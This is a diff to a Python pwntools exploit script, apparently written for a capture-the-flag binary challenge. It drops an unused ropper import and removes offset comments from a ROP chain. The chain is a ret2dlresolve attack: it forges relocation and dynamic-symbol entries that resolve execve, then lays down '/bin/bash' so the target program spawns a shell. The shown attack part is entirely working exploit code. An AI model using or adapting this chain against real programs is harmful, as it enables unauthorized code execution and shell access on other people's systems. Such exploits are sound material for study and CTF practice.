@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 from pwn import *
 import angr
-import ropper
 import time
 
 
@@ -162,16 +161,16 @@ def pwn():
     rop = ROP(elf)
     sh = b'/bin/bash\x00'
 
-    rop.raw(plt0)                               #0-4
-    rop.raw(fake_dlresolve_index)               #4-8
-    rop.raw(elf.plt['strncmp'])                 #8-12
-    rop.raw(fake_frame_addr + 80)               #12-16
-    rop.raw(0x00)                               #16-20
-    rop.raw(0x00)                               #20-24
-    rop.raw(fake_rel_plt)                       #24-32  rel.plt + (fake_dlresolve_index * 0x10)
-    rop.raw('a'*align)                          #32-36 
-    rop.raw(fake_dynsym)                        #36-52
-    rop.raw(b'execve\x00')                      #52-59
+    rop.raw(plt0)                               
+    rop.raw(fake_dlresolve_index)               
+    rop.raw(elf.plt['strncmp'])                 
+    rop.raw(fake_frame_addr + 80)               
+    rop.raw(0x00)                               
+    rop.raw(0x00)                               
+    rop.raw(fake_rel_plt)                       
+    rop.raw('a'*align)                          
+    rop.raw(fake_dynsym)                        
+    rop.raw(b'execve\x00')                      
     rop.raw('a'*(80 - len(rop.chain())))
     rop.raw(sh)
 
